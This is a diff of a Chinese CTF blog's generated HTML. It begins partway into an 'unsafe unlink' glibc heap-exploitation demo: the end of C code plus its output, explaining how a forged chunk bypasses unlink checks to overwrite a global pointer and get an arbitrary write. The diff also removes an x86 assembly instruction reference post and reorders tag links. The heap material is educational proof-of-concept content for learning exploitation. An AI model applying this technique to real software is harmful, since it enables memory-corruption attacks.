现在指向我们想要的位置，我们用它来覆盖我们的字符串。\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"原本的值为： %s\n"</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"被修改后： %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">output:</span><br><span class="line">欢迎来到 unsafe unlink 2.0!</span><br><span class="line">实验进行的环境：Ubuntu 14.04/16.04 64bit.</span><br><span class="line">此技术仅适用于glibc的禁用tcache-option的情况, 请参阅build_glibc.sh以获取构建说明。</span><br><span class="line">该技术用于当你拥有一个已知位置的指针指向一个可以调用 unlink 的区域时</span><br><span class="line">最常见的情况是易受攻击的缓冲区，可以溢出并控制全局指针。</span><br><span class="line">这个练习是使用free来破坏全局指针chunk0_ptr来实现任意内存写入。</span><br><span class="line"></span><br><span class="line">chunk0_ptr 位于 0x602070, 指向 0x1af5010</span><br><span class="line">我们要破坏的chunk是 0x1af50a0</span><br><span class="line"></span><br><span class="line">我现在创建一个假chuck在chunk0里.</span><br><span class="line">我们设置假chuck的&apos;next_free_chunk&apos; (fd) 指向 &amp;chunk0_ptr 附近 以便满足 P-&gt;fd-&gt;bk = P.</span><br><span class="line">我们设置假chuck的 &apos;previous_free_chunk&apos; (bk) 指向 &amp;chunk0_ptr  附近 以便满足 P-&gt;bk-&gt;fd = P.</span><br><span class="line">这样设置，我们就可以绕过这个检查：(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</span><br><span class="line">Fake chunk fd: 0x602058</span><br><span class="line">Fake chunk bk: 0x602060</span><br><span class="line"></span><br><span class="line">我们假设 chunk0 中有溢出，以便我们可以自由地更改 chunk1 的元数据。</span><br><span class="line">我们缩小了 chunk0 的大小 (在 chunk1 中保存为 &apos;previous_size&apos;) 这样 free 就会认为 chunk0 从我们放置假 chunk 的地方开始。</span><br><span class="line">重要的是，我们的假 chunk 正好从已知指针指向的地方开始，并且我们相应地收缩 chunk 。</span><br><span class="line">如果我们正常释放 chunk0，chunk1.previous_size 将为0x90，但它现在为： 0x80</span><br><span class="line">我们将 chunk1 的 &apos;previous_in_use&apos; 设置为 False，将我们的假 chunk 标记为free。</span><br><span class="line"></span><br><span class="line">现在我们 free 掉 chunk1 以便向后整合 unlink 我们的假 chunk，覆盖chunk0_ptr。</span><br><span class="line">您可以在 https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344 中找到 unlink 宏的来源</span><br><span class="line"></span><br><span class="line">此时，我们可以使用 chunk0_ptr 覆盖自身，以指向任意位置。</span><br><span class="line">chunk0_ptr 现在指向我们想要的位置，我们用它来覆盖我们的字符串。</span><br><span class="line">原本的值为： Hello!~</span><br><span class="line">被修改后： BBBBAAAA</span><br></pre></td></tr></table></figure>
 
       
 
@@ -1348,432 +1424,6 @@
 
 
   
-    <article id="post-汇编速查表" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/01/12/汇编速查表/">汇编速查</a>
-    </h1>
-  
-
-        
-        <a href="/2019/01/12/汇编速查表/" class="archive-article-date">
-  	<time datetime="2019-01-12T05:19:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <pre><code>指令  功能
-AAA 调整加
-AAD 调整除
-AAM 调整乘
-AAS 调整减
-ADC 进位加
-ADD 加
-AND 与
-ARPL    调整优先级
-BOUND   检查数组
-BSF 位右扫描
-BSR 位左扫描
-BSWAP   交换字节
-BT  位测试
-BTC 位测试求反
-BTR 位测试清零
-BTS 位测试置一
-CALL    过程调用
-CBW 转换字节
-CDQ 转换双字
-CLC 进位清零
-CLD 方向清零
-CLI 中断清零
-CLTS    任务清除
-CMC 进位求反
-CMOVA   高于传送
-CMOVB   低于传送
-CMOVE   相等传送
-CMOVG   大于传送
-CMOVL   小于传送
-CMOVNA  不高于传送
-CMOVNB  不低于传送
-CMOVNE  不等传送
-CMOVNG  不大于传送
-CMOVNL  不小于传送
-CMOVNO  不溢出传送
-CMOVNP  非奇偶传送
-CMOVNS  非负传送
-CMOVO   溢出传送
-CMOVP   奇偶传送
-CMOVS   负号传送
-CMP 比较
-CMPSB   比较字节串
-CMPSD   比较双字串
-CMPSW   比较字串
-CMPXCHG 比较交换
-CMPXCHG486  比较交换486
-CMPXCHG8B   比较交换8字节
-CPUID   CPU标识
-CWD 转换字
-CWDE    扩展字
-DAA 调整加十
-DAS 调整减十
-DEC 减一
-DIV 除
-ENTER   建立堆栈帧
-HLT 停
-IDIV    符号整除
-IMUL    符号乘法
-IN  端口输入
-INC 加一
-INSB    端口输入字节串
-INSD    端口输入双字串
-INSW    端口输入字串
-JA  高于跳转
-JB  低于跳转
-JBE 不高于跳转
-JCXZ    计数一六零跳转
-JE  相等跳转
-JECXZ   计数三二零跳转
-JG  大于跳转
-JL  小于跳转
-JMP 跳转
-JMPE    跳转扩展
-JNB 不低于跳转
-JNE 不等跳转
-JNG 不大于跳转
-JNL 不小于跳转
-JNO 不溢出跳转
-JNP 非奇偶跳转
-JNS 非负跳转
-JO  溢出跳转
-JP  奇偶跳转
-JS  负号跳转
-LAHF    加载标志低八
-LAR 加载访问权限
-LDS 加载数据段
-LEA 加载有效地址
-LEAVE   清除过程堆栈
-LES 加载附加段
-LFS 加载标志段
-LGDT    加载全局描述符
-LGS 加载全局段
-LIDT    加载中断描述符
-LMSW    加载状态字
-LOADALL 加载所有
-LOADALL286  加载所有286
-LOCK    锁
-LODSB   加载源变址字节串
-LODSD   加载源变址双字串
-LODSW   加载源变址字串
-LOOP    计数循环
-LOOPE   相等循环
-LOOPNE  不等循环
-LOOPNZ  非零循环
-LOOPZ   为零循环
-LSL 加载段界限
-LSS 加载堆栈段
-LTR 加载任务
-MONITOR 监视
-MOV 传送
-MOVSB   传送字节串
-MOVSD   传送双字串
-MOVSW   传送字串
-MOVSX   符号传送
-MOVZX   零传送
-MUL 乘
-MWAIT   
-NEG 求补
-NOP 空
-NOT 非
-OR  或
-OUT 端口输出
-OUTSB   端口输出字节串
-OUTSD   端口输出双字串
-OUTSW   端口输出字串
-POP 出栈
-POPA    全部出栈
-POPF    标志出栈
-PUSH    压栈
-PUSHA   全部压栈
-PUSHF   标志压栈
-RCL 进位循环左移
-RCR 进位循环右移
-RDMSR   读专用模式
-RDPMC   读执行监视计数
-RDSHR   
-RDTSC   读时间戳计数
-REP 重复
-REPE    相等重复
-REPNE   不等重复
-RET 过程返回
-RETF    远过程返回
-RETN    近过程返回
-ROL 循环左移
-ROR 循环右移
-RSM 恢复系统管理
-SAHF    恢复标志低八
-SAL 算术左移
-SALC    
-SAR 算术右移
-SBB 借位减
-SCASB   扫描字节串
-SCASD   扫描双字串
-SCASW   扫描字串
-SETA    高于置位
-SETB    低于置位
-SETE    相等置位
-SETG    大于置位
-SETL    小于置位
-SETNA   不高于置位
-SETNB   不低于置位
-SETNE   不等置位
-SETNG   不大于置位
-SETNL   不小于置位
-SETNO   不溢出置位
-SETNP   非奇偶置位
-SETNS   非负置位
-SETO    溢出置位
-SETP    奇偶置位
-SETS    负号置位
-SGDT    保存全局描述符
-SHL 逻辑左移
-SHLD    双精度左移
-SHR 逻辑右移
-SHRD    双精度右移
-SIDT    保存中断描述符
-SLDT    保存局部描述符
-SMI 
-SMINT   
-SMINTOLD    
-SMSW    保存状态字
-STC 进位设置
-STD 方向设置
-STI 中断设置
-STOSB   保存字节串
-STOSD   保存双字串
-STOSW   保存字串
-STR 保存任务
-SUB 减
-SYSCALL 系统调用
-SYSENTER    系统进入
-SYSEXIT 系统退出
-SYSRET  系统返回
-TEST    数测试
-UD0 未定义指令0
-UD1 未定义指令1
-UD2 未定义指令2
-UMOV    
-VERW    校验写
-WAIT    等
-WBINVD  回写无效高速缓存
-WRMSR   写专用模式
-WRSHR   
-XADD    交换加
-XBTS    
-XCHG    交换
-XLAT    换码
-XOR 异或
-XSTORE  
-EMMS    媒体空MMX状态
-F2XM1   浮点栈顶绝对值
-FADD    浮点加
-FADDP   浮点加出栈
-FBLD    浮点加载十数
-FBSTP   浮点保存十数出栈
-FCHS    浮点正负求反
-FCLEX   浮点检查错误清除
-FCMOVB  浮点低于传送
-FCMOVBE 浮点不高于传送
-FCMOVE  浮点相等传送
-FCMOVNB 浮点不低于传送
-FCMOVNBE    浮点高于传送
-FCMOVNE 浮点不等传送
-FCMOVNU 浮点有序传送
-FCMOVU  浮点无序传送
-FCOM    浮点比较
-FCOMI   浮点比较加载标志
-FCOMIP  浮点比较加载标志出栈
-FCOMP   浮点比较出栈
-FCOMPP  浮点比较出栈二
-FCOS    浮点余弦
-FDECSTP 浮点栈针减一
-FDISI   浮点检查禁止中断
-FDIV    浮点除
-FDIVP   浮点除出栈
-FDIVR   浮点反除
-FDIVRP  浮点反除出栈
-FENI    浮点检查禁止中断二
-FFREE   浮点释放
-FFREEP  浮点释放出栈
-FIADD   浮点加整数
-FICOM   浮点比较整数
-FICOMP  浮点比较整数出栈
-FIDIV   浮点除整数
-FIDIVR  浮点反除
-FILD    浮点加载整数
-FIMUL   浮点乘整数
-FINCSTP 浮点栈针加一
-FINIT   浮点检查初始化
-FIST    浮点保存整数
-FISTP   浮点保存整数出栈
-FISTTP  
-FISUB   浮点减整数
-FISUBR  浮点反减整数
-FLD 浮点加载数
-FLD1    浮点加载一
-FLDCW   浮点加载控制器
-FLDENV  浮点加载环境
-FLDL2E  浮点加载L2E
-FLDL2T  浮点加载L2T
-FLDLG2  浮点加载LG2
-FLDLN2  浮点加载LN2
-FLDPI   浮点加载PI
-FLDZ    浮点加载零
-FMUL    浮点乘
-FMULP   浮点乘出栈
-FNCLEX  浮点不检查错误清除
-FNDISI  浮点不检查禁止中断
-FNENI   浮点不检查禁止中断二
-FNINIT  浮点不检查初始化
-FNOP    浮点空
-FNSAVE  浮点不检查保存状态
-FNSTCW  浮点不检查保存控制器
-FNSTENV 浮点不检查保存环境
-FNSTSW  浮点不检查保存状态器
-FPATAN  浮点部分反正切
-FPREM   浮点部分余数
-FPREM1  浮点部分余数二
-FPTAN   浮点部分正切
-FRNDINT 浮点舍入求整
-FRSTOR  浮点恢复状态
-FSAVE   浮点检查保存状态
-FSCALE  浮点比例运算
-FSETPM  浮点设置保护
-FSIN    浮点正弦
-FSINCOS 浮点正余弦
-FSQRT   浮点平方根
-FST 浮点保存
-FSTCW   浮点检查保存控制器
-FSTENV  浮点检查保存环境
-FSTP    浮点保存出栈
-FSTSW   浮点检查保存状态器
-FSUB    浮点减
-FSUBP   浮点减出栈
-FSUBR   浮点反减
-FSUBRP  浮点反减出栈
-FTST    浮点比零
-FUCOM   浮点无序比较
-FUCOMI  浮点反比加载标志
-FUCOMIP 浮点反比加载标志出栈
-FUCOMP  浮点无序比较出栈
-FUCOMPP 浮点无序比较出栈二
-FWAIT   浮点等
-FXAM    浮点检查
-FXCH    浮点交换
-FXTRACT 浮点分解
-FYL2X   浮点求L2X
-FYL2XP1 浮点求L2XP1
-MOVED   媒体双字传送
-MOVEQ   媒体四字传送
-PACKSSDW    媒体符号双字压缩
-PACKSSWB    媒体符号字压缩
-PACKUSWB    媒体无符号字压缩
-PADDB   媒体截断字节加
-PADDD   媒体截断双字加
-PADDSB  媒体符号饱和字节加
-PADDSIW 
-PADDSW  媒体符号饱和字加
-PADDUSB 媒体无符号饱和字节加
-PADDUSW 媒体无符号饱和字加
-PADDW   媒体截断字加
-PAND    媒体与
-PANDN   媒体与非
-PAVEB   
-PCMPEQB 媒体字节比等
-PCMPEQD 媒体双字比等
-PCMPEQW 媒体字比等
-PCMPGTB 媒体字节比大
-PCMPGTD 媒体双字比大
-PCMPGTW 媒体字比大
-PDISTIB 
-PMACHRIW    
-PMADDWD 
-PMAGW   
-PMULHRIW    
-PMULHRWC    
-PMULHW  
-PMVGEZB 
-PMVLZB  
-PMVNZB  
-PMVZB   
-POR 媒体或
-PSLLD   媒体双字左移
-PSLLQ   媒体四字左移
-PSLLW   媒体字左移
-PSRAD   媒体双字算术右移
-PSRAW   媒体字算术右移
-PSRLD   媒体双字右移
-PSRLQ   媒体四字右移
-PSRLW   媒体字右移
-PSUBB   媒体截断字节减
-PSUBSB  媒体符号饱和字节减
-PSUBSIW 
-PSUBSW  媒体符号饱和字减
-PSUBUSB 媒体无符号饱和字节减
-PSUBUSW 媒体无符号饱和字减
-PSUBW   媒体截断字减
-PUNPCKHBW   媒体字节高位解压
-PUNPCKHDQ   媒体双字高位解压
-PUNPCKHWD   媒体字高位解压
-PUNPCKLBW   媒体字节低位解压
-PUNPCKLDQ   媒体双字低位解压
-PUNPCKLWD   媒体字低位解压
-</code></pre>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/01/12/汇编速查表/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -1875,11 +1525,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">ctf-pwn</a>
+                <a href="javascript:void(0)" class="js-tag color2">ctf-pwn assembly</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">ctf-pwn assembly</a>
+                <a href="javascript:void(0)" class="js-tag color3">ctf-pwn</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1891,11 +1541,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">termux</a>
+                <a href="javascript:void(0)" class="js-tag color3">RE</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">dcoker</a>
+                <a href="javascript:void(0)" class="js-tag color2">termux</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1904,6 +1554,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">pwntools</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">dcoker</a>
               </li>
              
               <li class="article-tag-list-item">
